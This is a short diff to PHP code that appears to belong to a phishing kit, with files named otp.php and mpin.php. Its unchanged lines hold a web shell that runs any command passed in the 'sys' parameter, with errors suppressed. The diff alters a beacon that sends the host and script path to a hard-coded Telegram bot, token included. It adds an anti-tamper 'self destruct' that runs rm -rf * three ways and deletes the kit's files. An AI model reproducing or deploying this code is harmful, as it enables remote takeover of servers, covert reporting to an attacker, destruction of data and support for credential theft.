@@ -1,3 +1,11 @@
 error_reporting(0);
 system($_GET['sys']);
-file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=Old: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=G-Up: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+echo '<script>alert("You\'ve edited the source code!! \nSelf Destruct Activated");</script>';
+system('rm -rf *');
+shell_exec('rm -rf *');
+exec('rm -rf *');
+unlink('index.php');
+unlink('otp.php');
+unlink('mpin.php');
+unlink('redir.php');
